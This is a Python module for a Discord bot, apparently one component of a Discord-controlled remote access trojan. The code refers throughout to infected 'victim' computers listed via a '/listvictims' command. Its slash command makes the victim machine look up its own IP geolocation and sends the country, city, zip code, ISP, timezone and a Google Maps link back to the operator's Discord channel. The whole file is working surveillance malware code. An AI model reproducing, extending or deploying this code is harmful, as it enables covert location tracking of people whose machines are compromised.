import disnake as discord
from disnake.ext import commands
from datetime import datetime

import os, requests
nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"

class Geolocate(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.ip_addr = self.bot.ip_addr
        
    @commands.slash_command( )
    async def get_geolocation(self, ctx, victim):
        """Finds all geolocation information of victim
        
        Parameters
        ----------
        victim: Identifier of the affected computer (found via /listvictims).
        """
        if str(victim) == str(self.bot.identifier):
            await ctx.response.defer()
            
            data = requests.get("http://ip-api.com/json/").json()
            if data["status"] != "success": 
                return await ctx.send("```Unable to get Geolocation Info!```")
                
            embed = self.bot.genEmbed(
                "Geolocation Information\n(Powered by ip-api)", 
                datetime.now(),
                f"[Google Maps link](https://www.google.com/maps/search/google+map++{data['lat']},{data['lon']})"
            )
                
            embed.add_field( name="Country", value=f"{data['country']} ({data['countryCode']})" )
            embed.add_field( name="City",    value=data["city"]       )
            embed.add_field( name="Region",  value=data["regionName"] )
            embed.add_field( name="Zip code", value=data["zip"]       )
            embed.add_field( name="ISP",      value=data["isp"]       )
            embed.add_field( name="Timezone", value=data["timezone"]  )

            await ctx.followup.send(embed=embed)

def setup(bot: commands.Bot):
    bot.add_cog(Geolocate(bot))